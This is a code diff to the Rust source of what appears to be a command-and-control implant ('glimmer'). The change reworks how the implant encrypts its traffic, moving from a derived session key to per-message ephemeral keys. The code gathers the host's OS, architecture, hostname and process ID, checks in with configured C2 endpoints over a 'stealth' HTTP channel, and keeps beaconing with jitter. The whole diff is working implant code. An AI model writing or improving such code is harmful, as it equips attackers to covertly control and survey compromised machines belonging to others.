@@ -1,7 +1,7 @@
-use glimmer::c2::{Channel, SendContext};
 use glimmer::c2::http::HTTPChannel;
+use glimmer::c2::{Channel, SendContext};
 use glimmer::cfg::Config;
-use glimmer::crypto::EphemeralKeypair;
+use glimmer::crypto;
 use glimmer::identity;
 use glimmer::proto::{CheckinData, Envelope, MsgType};
 
@@ -24,19 +24,6 @@ fn main() {
         }
     };
 
-    let keypair = EphemeralKeypair::generate();
-    let pub_key_bytes = keypair.public_key_bytes();
-
-    let session_key = match keypair.derive_session_key(&server_pub) {
-        Ok(k) => k,
-        Err(e) => {
-            eprintln!("ECDH derivation failed: {}", e);
-            std::process::exit(1);
-        }
-    };
-
-    eprintln!("[dev] session key derived");
-
     let channel = match HTTPChannel::new(config.c2_endpoints.clone()) {
         Ok(c) => c,
         Err(e) => {
@@ -45,37 +32,49 @@ fn main() {
         }
     };
 
-    eprintln!(
-        "[dev] channel: {} (stealth={}, max={})",
+    glimmer::dbg_log!(
+        "channel: {} (stealth={}, max={})",
         channel.info().name,
         channel.info().stealth,
         channel.info().max_payload
     );
 
-    // Checkin — prepend raw public key to encrypted payload
+    // Checkin — ephemeral encryption, request response
     let checkin = CheckinData {
         os: std::env::consts::OS.into(),
         arch: std::env::consts::ARCH.into(),
         host: hostname(),
         pid: std::process::id(),
-        pub_key: pub_key_bytes.clone(),
+        pub_key: vec![], // no longer needed — each message has its own ephemeral key
     };
 
-    match send_checkin(
+    match send_with_response(
+        MsgType::Checkin,
         &node_id,
-        &checkin,
-        &pub_key_bytes,
-        &session_key,
+        Some(&checkin),
         &server_pub,
         &channel,
     ) {
-        Ok(_) => eprintln!("[dev] checkin sent"),
-        Err(e) => eprintln!("[dev] checkin failed: {}", e),
+        Ok(Some(_response)) => {
+            glimmer::dbg_log!("checkin sent, response: {} bytes", _response.len());
+        }
+        Ok(None) => {
+            eprintln!("[dev] checkin sent, no response");
+        }
+        Err(e) => {
+            eprintln!("[dev] checkin failed: {}", e);
+        }
     }
 
-    // Beacon loop
+    // Beacon loop — ephemeral encryption, no response needed
     loop {
-        match send_beacon(&node_id, &session_key, &server_pub, &channel) {
+        match send_no_response(
+            MsgType::Beacon,
+            &node_id,
+            None::<&()>,
+            &server_pub,
+            &channel,
+        ) {
             Ok(_) => eprintln!("[dev] beacon sent"),
             Err(e) => eprintln!("[dev] beacon failed: {}", e),
         }
@@ -84,39 +83,63 @@ fn main() {
     }
 }
 
-fn send_checkin(
+/// Send a message with per-message ephemeral encryption.
+/// No persistent keys — one-time key exists only during this call.
+fn send_no_response<T: serde::Serialize>(
+    msg_type: MsgType,
     node_id: &str,
-    checkin: &CheckinData,
-    pub_key: &[u8],
-    key: &glimmer::crypto::SessionKey,
+    payload: Option<&T>,
     server_pub: &[u8],
     channel: &dyn Channel,
 ) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
-    let envelope = Envelope::with_data(MsgType::Checkin, node_id, checkin)?;
+    let envelope = match payload {
+        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
+        None => Envelope::new(msg_type, node_id, None),
+    };
+
     let serialized = envelope.marshal()?;
-    let encrypted = key.encrypt(&serialized)?;
 
-    // Prepend beacon public key for ECDH
-    let mut payload = Vec::with_capacity(pub_key.len() + encrypted.len());
-    payload.extend_from_slice(pub_key);
-    payload.extend_from_slice(&encrypted);
+    // Per-message ephemeral encryption — key exists only for this call
+    let encrypted = crypto::encrypt_for_server(&serialized, server_pub)?;
 
-    let ctx = SendContext::new(server_pub, &node_id, payload);
+    let ctx = SendContext::new(server_pub, node_id, encrypted);
     channel.send(&ctx)
 }
 
-fn send_beacon(
+/// Send a message and decrypt the response.
+/// Two ephemeral keypairs: one for sending (consumed immediately),
+/// one for response (consumed when response is decrypted).
+fn send_with_response<T: serde::Serialize>(
+    msg_type: MsgType,
     node_id: &str,
-    key: &glimmer::crypto::SessionKey,
+    payload: Option<&T>,
     server_pub: &[u8],
     channel: &dyn Channel,
 ) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
-    let envelope = Envelope::new(MsgType::Beacon, node_id, None);
-    let serialized = envelope.marshal()?;
-    let encrypted = key.encrypt(&serialized)?;
+    let envelope = match payload {
+        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
+        None => Envelope::new(msg_type, node_id, None),
+    };
 
-    let ctx = SendContext::new(server_pub, &node_id,encrypted);
-    channel.send(&ctx)
+    let serialized = envelope.marshal()?;
+
+    let (encrypted, response_kp) =
+        crypto::encrypt_for_server_with_response(&serialized, server_pub)?;
+
+    let ctx = SendContext::new(server_pub, node_id, encrypted);
+    let response = channel.send(&ctx)?;
+
+    match response {
+        Some(resp_bytes) if !resp_bytes.is_empty() => {
+            let decrypted = response_kp.decrypt_response(&resp_bytes, server_pub)?;
+            Ok(Some(decrypted))
+        }
+        _ => {
+            // response_kp drops here — private key zeroized even if unused
+            drop(response_kp);
+            Ok(None)
+        }
+    }
 }
 
 fn sleep(base: std::time::Duration, jitter: f64) {
